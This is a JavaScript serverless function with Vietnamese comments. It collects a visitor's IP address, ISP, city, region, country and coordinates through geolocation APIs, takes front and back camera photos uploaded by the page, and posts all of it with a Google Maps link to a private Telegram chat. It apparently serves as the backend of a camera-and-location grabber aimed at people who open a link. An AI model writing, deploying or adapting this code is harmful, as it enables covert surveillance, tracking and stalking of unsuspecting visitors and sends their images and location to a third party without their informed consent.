// api/tele-proxy.js - PHIÊN BẢN FIXED
export const config = { runtime: "edge" };

export default async function handler(req) {
  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (req.method !== "POST")
    return new Response("Method Not Allowed", { status: 405 });

  try {
    // 1. LẤY THÔNG TIN IP & ĐỊA CHỈ TỪ SERVER
    const userIP =
      req.headers.get("x-forwarded-for")?.split(",")[0].trim() || 
      req.headers.get("cf-connecting-ip") ||
      "Unknown";

    let lat = "0";
    let lon = "0";
    let city = "Unknown";
    let region = "Unknown";
    let country = "Unknown";
    let isp = "VNNIC";

    // TRY: API ipapi.co (RECOMMENDED - Tốt nhất)
    if (userIP !== "Unknown") {
      try {
        const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`, {
          headers: { "Accept": "application/json" },
        });
        
        if (geoRes.ok) {
          const geo = await geoRes.json();
          lat = String(geo.latitude || "0");
          lon = String(geo.longitude || "0");
          city = geo.city || "Unknown";
          region = geo.region || "Unknown";
          country = geo.country_name || "Unknown";
          isp = geo.org || "Unknown";
        }
      } catch (e) {
        console.log("ipapi.co failed, trying ip-api.com...");
        
        // FALLBACK: API ip-api.com
        try {
          const geoRes = await fetch(`https://ip-api.com/json/${userIP}?fields=lat,lon,city,regionName,country,isp`);
          
          if (geoRes.ok) {
            const geo = await geoRes.json();
            if (geo.status === "success") {
              lat = String(geo.lat || "0");
              lon = String(geo.lon || "0");
              city = geo.city || "Unknown";
              region = geo.regionName || "Unknown";
              country = geo.country || "Unknown";
              isp = geo.isp || "Unknown";
            }
          }
        } catch (e2) {
          console.log("All geo APIs failed:", e2.message);
        }
      }
    }

    // 2. NHẬN DỮ LIỆU TỪ CLIENT
    const contentType = req.headers.get("content-type") || "";
    let clientData = {};
    let formData = null;

    if (contentType.includes("multipart/form-data")) {
      formData = await req.formData();
      clientData = JSON.parse(formData.get("clientInfo") || "{}");
    } else {
      clientData = await req.json();
    }

    // 3. KIỂM TRA ĐIỀU KIỆN ẢNH (BẮT BUỘC PHẢI CÓ ẢNH MỚI GỬI)
    const hasFront = formData && formData.has("front");
    const hasBack = formData && formData.has("back");

    // Nếu KHÔNG có cả ảnh trước lẫn ảnh sau -> Bỏ qua, không gửi gì lên Telegram
    if (!hasFront && !hasBack) {
      return new Response(
        JSON.stringify({
          success: false,
          message: "No photo captured, skipped sending.",
        }),
        {
          status: 200,
          headers: { "Content-Type": "application/json" },
        },
      );
    }

    // ✅ FIXED: Google Maps URL đúng + Format lại vĩ độ/kinh độ
    const googleMapsUrl = `https://www.google.com/maps/search/${lat},${lon}/@${lat},${lon},15z`;
    const address = `${city}, ${region}, ${country}`;

    // 4. TẠO CAPTION KHI CÓ ẢNH
    const finalCaption = `
📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]

🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
📱 Thiết bị: ${clientData.device || "Unknown"}
🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
🌍 IP dân cư: ${userIP}
🏢 ISP/Nhà mạng: ${isp}
🏙️ Địa chỉ: ${address}
🌎 Quốc gia: ${country}
📍 Vĩ độ (Latitude): ${lat}
📍 Kinh độ (Longitude): ${lon}
📌 Google Maps: ${googleMapsUrl}
📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}

⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
`.trim();

    // 5. GỬI ĐẾN TELEGRAM (Gửi Album ảnh kèm caption)
    const teleForm = new FormData();
    teleForm.append("chat_id", CHAT_ID);

    const media = [];

    if (hasFront) {
      media.push({
        type: "photo",
        media: "attach://front",
        caption: finalCaption,
        parse_mode: "HTML",
      });
      teleForm.append("front", formData.get("front"));
    }

    if (hasBack) {
      // Nếu có ảnh trước rồi thì ảnh sau không cần gắn lại caption nữa
      media.push({
        type: "photo",
        media: "attach://back",
        caption: !hasFront ? finalCaption : "",
      });
      teleForm.append("back", formData.get("back"));
    }

    teleForm.append("media", JSON.stringify(media));

    const res = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMediaGroup`,
      {
        method: "POST",
        body: teleForm,
      },
    );

    const teleResult = await res.text();
    
    return new Response(
      JSON.stringify({
        success: res.ok,
        message: res.ok ? "Sent to Telegram successfully" : "Telegram API error",
        ip: userIP,
        location: { lat, lon, city, region, country },
      }),
      { 
        status: res.ok ? 200 : 400,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ 
        error: err.message,
        success: false 
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }
}
